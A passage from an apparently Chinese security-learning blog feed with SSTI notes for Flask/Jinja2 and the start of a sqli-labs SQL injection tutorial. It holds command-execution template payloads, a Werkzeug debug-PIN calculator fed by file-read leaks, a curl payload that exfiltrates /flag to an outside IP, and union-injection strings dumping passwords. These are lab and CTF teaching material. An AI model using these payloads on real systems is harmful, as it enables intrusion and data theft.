id="Length过滤器绕过数字过滤"><a href="#Length过滤器绕过数字过滤" class="headerlink" title="Length过滤器绕过数字过滤"></a>Length过滤器绕过数字过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 5</span><br><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length*&#x27;aaa&#x27;|length%&#125;&#123;&#123;a&#125;&#125;# 15</span><br><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length*&#x27;aaa&#x27;|length-&#x27;aaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 12</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;](&#x27;popen&#x27;)(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length-&#x27;a&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 199</span><br><span class="line"></span><br><span class="line">&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length-&#x27;a&#x27;|length %&#125;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h2><p>通过<code>&#123;&#123;config&#125;&#125;</code>查看（无过滤）</p><p><strong>flask内置函数和对象</strong></p><ul><li>flask内置函数</li></ul><blockquote><p><code>lipsum</code> 可加载第三方库</p><p><code>url_for</code> 可返回url路径</p><p><code>get_flashed_message</code> 可获取信息</p></blockquote><ul><li>flask内置对象</li></ul><blockquote><p><code>cycler</code> </p><p><code>joiner</code> </p><p><code>namespace</code> </p><p><code>config</code> </p><p><code>request</code> </p><p><code>session</code> </p></blockquote><p>可利用已加载内置函数或对象寻找被过滤字符串</p><p>可利用内置函数调用current_app模块，进而查看配置文件</p><p><strong>current_app</strong></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/current.png" alt=""></p><p><strong>调用current_app相当于调用flask</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="混合过滤绕过"><a href="#混合过滤绕过" class="headerlink" title="混合过滤绕过"></a>混合过滤绕过</h2><p><strong>dict()和join</strong></p><blockquote><p><code>dict()</code> 用来创建一个字典</p><p><code>join</code> 将一个序列中的参数值拼接成字符串</p></blockquote><p><strong>eg：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=dict(Spongebob)%&#125;&#123;&#123;a&#125;&#125;# 创建字典a，键名Spongebob，键值1</span><br><span class="line"></span><br><span class="line">&#123;% set a=dict(__cla=1,ss__=2)join%&#125;&#123;&#123;a&#125;&#125;# 创建字典a，join把参数值拼接成字符串</span><br></pre></td></tr></table></figure><p><strong>获取符号</strong></p><p>利用flask内置函数和对象获取符号，<code>&#123;&#123;a[n]&#125;&#125;</code>可以获取指定字符（n为指定字符下标）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=(&#123;&#125;|select()|string())%&#125;&#123;&#123;a&#125;&#125;# 获取下划线</span><br><span class="line">&#123;% set a=(self|string())%&#125;&#123;&#123;a&#125;&#125;# 获取空格</span><br><span class="line">&#123;% set a=(self|string|urlencode%&#125;&#123;&#123;a&#125;&#125;# 获取百分号</span><br><span class="line">&#123;% set a=(app.__doc__|string)%&#125;&#123;&#123;a&#125;&#125;# </span><br></pre></td></tr></table></figure><h1 id="debug-pin码计算"><a href="#debug-pin码计算" class="headerlink" title="debug pin码计算"></a>debug pin码计算</h1><h2 id="pin码生成原理"><a href="#pin码生成原理" class="headerlink" title="pin码生成原理"></a>pin码生成原理</h2><p><strong>pin码主要由六个参数构成</strong></p><ol><li><code>username</code> 执行代码时候的用户名</li><li><code>getattr(app,&quot;__name__&quot;,app.__class__.__name__)</code> 固定Flask</li><li><code>modname</code> 固定值默认flask.app</li><li><code>getattr(mod,&quot;__file__,None)</code> app.py文件所在路径</li><li><code>str(uuid,getnode())</code> 电脑上mac地址（十进制）</li><li><code>get_machine_id()</code> 根据操作系统不同，有四种获取方式</li></ol><blockquote><p>生成pin码Debugger PIN的代码在<code>get_pin_and_cookie_name</code></p></blockquote><h2 id="pin码计算"><a href="#pin码计算" class="headerlink" title="pin码计算"></a>pin码计算</h2><p><strong>条件：</strong>有文件包含或文件读取漏洞，且开启debug功能</p><p>例题：</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_01.png" alt=""></p><p>点击Read somethings会跳转页面，url可以进行修改，从而读取服务器部分文件</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_02.png" alt=""></p><p><code>/etc/passwd</code>可以看到用户名，1000以上一般为人为创建，默认为root</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_03.png" alt=""></p><p><strong>关于uuid的读取</strong></p><blockquote><p><code>/sys/classs/net/ens33/address</code> CentOS</p><p><code>/sys/classs/net/eth0/address</code>  ubuntu</p></blockquote><p><strong>关于machine_id的读取</strong></p><blockquote><p><code>/etc/machine-id</code> 在前</p><p><code>/proc/self/cgroup</code> docker    第一行最后一部分</p></blockquote><h2 id="计算pin码的脚本"><a href="#计算pin码的脚本" class="headerlink" title="计算pin码的脚本"></a>计算pin码的脚本</h2><p><strong>python2.7</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">                                                                    <span class="string">&#x27;root&#x27;</span>,<span class="comment">#username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app,&#x27;__name__&#x27;,getattr(app.__class__,&#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span><span class="comment"># getattr(mod,&#x27;__file__&#x27;,None)</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),/sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;b7471d41202f4da392a4743b37ea3b69&#x27;</span><span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits,private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit,<span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(),<span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size,<span class="string">&#x27;0&#x27;</span>)<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><strong>python3.10</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">                                                                    <span class="string">&#x27;root&#x27;</span>,<span class="comment">#username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app,&#x27;__name__&#x27;,getattr(app.__class__,&#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span><span class="comment"># getattr(mod,&#x27;__file__&#x27;,None)</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),/sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;b7471d41202f4da392a4743b37ea3b69&#x27;</span><span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits,private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit,<span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(),<span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size,<span class="string">&#x27;0&#x27;</span>)<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h1 id="常用Payload"><a href="#常用Payload" class="headerlink" title="常用Payload"></a>常用Payload</h1><h2 id="普通过滤payload"><a href="#普通过滤payload" class="headerlink" title="普通过滤payload"></a>普通过滤payload</h2><ul><li>获取eval函数执行任意代码测试：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="究极过滤payload"><a href="#究极过滤payload" class="headerlink" title="究极过滤payload"></a>究极过滤payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glo=a,bals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set get=dict(get=a)|join%&#125;&#123;% set os=dict(os=a)|join %&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set ca=dict(ca=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set dd=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set bin=(xiahuaxian,xiahuaxian,dict(built=a,ins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set chcr=(lipsum|attr(gb))|attr(get)(bin)|attr(get)(cr) %&#125;</span><br><span class="line">&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set dh=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set ls=dict(ls=a)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set space=chcr(three*three*five-five-five-three) %&#125;</span><br><span class="line">&#123;% set shell=(ca,space,dict(f1ag=a)|join,dh,dict(txt=a)|join)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print(shell)%&#125;</span><br><span class="line">&#123;%print(lipsum|attr(gb)|attr(get)(os)|attr(popen)(shell)|attr(rd)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="外带payload"><a href="#外带payload" class="headerlink" title="外带payload"></a>外带payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set c=dict(c=z)|join|length %&#125;</span><br><span class="line">&#123;% set cc=dict(cc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccc=dict(ccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccc=dict(cccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;</span><br><span class="line">&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;</span><br><span class="line">&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;</span><br><span class="line">&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;</span><br><span class="line">&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,cccc,ccccccccc,point,cc,ccc,cc,point,ccccccc,cccccc,point,c,cccc,maohao,cccc,c-c,c-c,c-c,xiegang,result)|join %&#125; </span><br><span class="line">&#123;% set ohs=dict(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门 </a></p><p><a href="https://www.cnblogs.com/chalan630/p/12578418.html#一-什么是ssti">SSTI(模板注入)</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI完全学习</a></p><p><a href="https://www.jianshu.com/p/a1d6ae580add">flask ssti漏洞复现 </a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">SSTI(服务器模板注入)学习</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入)</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-9">用python继承链搞事情</a></p><p><a href="https://cloud.tencent.com/developer/article/1637529">Python安全之SSTI——Flask/Jinja2</a></p><p><a href="https://xz.aliyun.com/t/7746#toc-10">SSTI模板注入(Python+Jinja2)</a></p><p><a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI模板注入/">SSTI模板注入</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/">一篇文章带你理解漏洞之 SSTI 漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/07/26/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/26/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p><strong>SQL注入</strong>（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p></blockquote><h1 id="常见的注入手法"><a href="#常见的注入手法" class="headerlink" title="常见的注入手法"></a>常见的注入手法</h1><p>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型</p><p><strong>参数类型分类</strong></p><ul><li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li></ul><p>如 <code>www.text.com/text.php?id=3</code> 对应的sql语句为 <code>select * from table where id=3</code></p><ul><li>字符型：字符型注入正好相反</li></ul><p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p><p>例如数字型语句：<code>select * from table where id =3</code></p><p>则字符型如下：<code>select * from table where name=&#39;admin&#39;</code></p><p><strong>注入手法分类</strong></p><ul><li>UNION query SQL injection（联合查询注入）</li><li>Error-based SQL injection（错型注入）</li><li>Boolean-based blind SQL injection（基于布尔的盲注）</li><li>Time-based blind SQL injection（基于时间的盲注）</li><li>Stacked queries SQL injection（可多语句查询注入）</li></ul><h2 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h2><blockquote><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 </p></blockquote><p>我们以sqli-labs第一关为例来学习联合查询。如下，要求我们传入一个id值过去。传参?id=1，当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql.png" alt=""></p><ul><li>注入点判断</li></ul><p>开始判断是否存在注入，输入<code>?id=1&#39;</code>，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_01.png" alt=""></p><p>继续判断，输入<code>?id=1&#39; and 1=1 --+</code> 页面正常显示</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_02.png" alt=""></p><p><code>?id=1&#39; and 1=2 --+</code> 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_03.png" alt=""></p><ul><li>判断当前表的字段个数</li></ul><p>输入order by 3，页面无异常反应</p><p><code>?id=1&#39; order by 3 --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_04.png" alt=""></p><p>将3修改为4，此时显示未知的列，说明此时当前表中只有3列</p><p><code>?id=1&#39; order by 4 --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_05.png" alt=""></p><ul><li>判断显示位</li></ul><p>以下为union注入中较为常用的一些函数和环境变量</p><div class="table-container"><table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>version()</td><td>MySQL 版本</td></tr><tr><td>user()</td><td>当前数据库用户名</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>@@version_compile_os</td><td>操作系统版本</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr></tbody></table></div><p>接下来测试我们的输入会在屏幕哪个地方进行回显。上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据</p><p>需让<code>union select</code>前面的参数查不出来而回显后面的语句，所以<code>id=-1&#39;</code></p><p><code>?id=-1&#39; union select 1,2,3 --+</code></p><p>如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_06.png" alt=""></p><ul><li>爆当前数据库名字</li></ul><p><code>?id=-1&#39; union select 1,2,database() --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_07.png" alt=""></p><ul><li>爆当前数据库中的表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接套用语句</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p>显示当前数据库中存在4个表<code>emails,referers,uagents,users</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_08.png" alt=""></p><ul><li>爆表中的字段</li></ul><p>我们这里选择users表进行进一步的获取表中的字段信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名即可</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#或者指定当前数据库名</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>获取<code>users</code>表中存在3个字段，分别为<code>id,username,password</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_09.png" alt=""></p><ul><li>爆相应字段的所有数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名和字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="string">&#x27;,`username`,&#x27;</span>:<span class="string">&#x27;,`password`) from users --+</span></span><br><span class="line"><span class="string">#字段值不加反引号也可以</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span 